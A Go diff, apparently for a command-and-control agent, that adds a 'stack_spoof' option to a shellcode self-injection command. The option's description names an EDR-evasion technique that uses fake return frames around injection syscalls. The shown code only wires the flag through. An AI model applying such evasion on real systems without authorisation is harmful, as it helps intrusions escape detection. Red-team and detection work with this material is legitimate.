@@ -111,6 +111,19 @@ func init() {
 					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 5},
 				},
 			},
+			{
+				Name:             "stack_spoof",
+				ModalDisplayName: "Stack Spoof",
+				CLIName:          "stack_spoof",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Spoof the call stack during injection API calls. Executes NtAllocateVirtualMemory/NtWriteVirtualMemory/NtCreateThreadEx from a dedicated thread with fake kernel32/ntdll return frames, evading EDR thread stack scanners. Requires indirect_syscalls and stack_spoof build options.",
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 6},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 6},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 6},
+				},
+			},
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -157,6 +170,7 @@ func init() {
 				encoding = "none"
 			}
 			key, _ := taskData.Args.GetStringArg("key")
+			stackSpoof, _ := taskData.Args.GetBooleanArg("stack_spoof")
 
 			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
 			if sc != "" {
@@ -166,12 +180,15 @@ func init() {
 					response.Error = "shellcode_b64 is not valid base64: " + err.Error()
 					return response
 				}
-				params := map[string]interface{}{"shellcode_b64": sc, "technique": technique, "encoding": encoding, "key": key}
+				params := map[string]interface{}{"shellcode_b64": sc, "technique": technique, "encoding": encoding, "key": key, "stack_spoof": stackSpoof}
 				paramsJSON, _ := json.Marshal(params)
 				taskData.Args.SetManualArgs(string(paramsJSON))
 				displayParams := fmt.Sprintf("Shellcode: base64 (%d bytes), Technique: %s", len(decoded), technique)
 				if encoding != "none" && encoding != "" {
 					displayParams += fmt.Sprintf(", Encoding: %s", encoding)
+				}
+				if stackSpoof {
+					displayParams += ", Stack Spoof: enabled"
 				}
 				response.DisplayParams = &displayParams
 				createArtifact(taskData.Task.ID, "API Call", "VirtualAlloc/CreateThread (self-injection)")
@@ -242,6 +259,9 @@ func init() {
 			if encoding != "none" && encoding != "" {
 				displayParams += fmt.Sprintf(", Encoding: %s", encoding)
 			}
+			if stackSpoof {
+				displayParams += ", Stack Spoof: enabled"
+			}
 			response.DisplayParams = &displayParams
 			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("Shellcode self-injection via %s (%d bytes)", technique, len(fileContents)))
 
@@ -250,6 +270,7 @@ func init() {
 				"technique":     technique,
 				"encoding":      encoding,
 				"key":           key,
+				"stack_spoof":   stackSpoof,
 			}
 			paramsJSON, err := json.Marshal(params)
 			if err != nil {
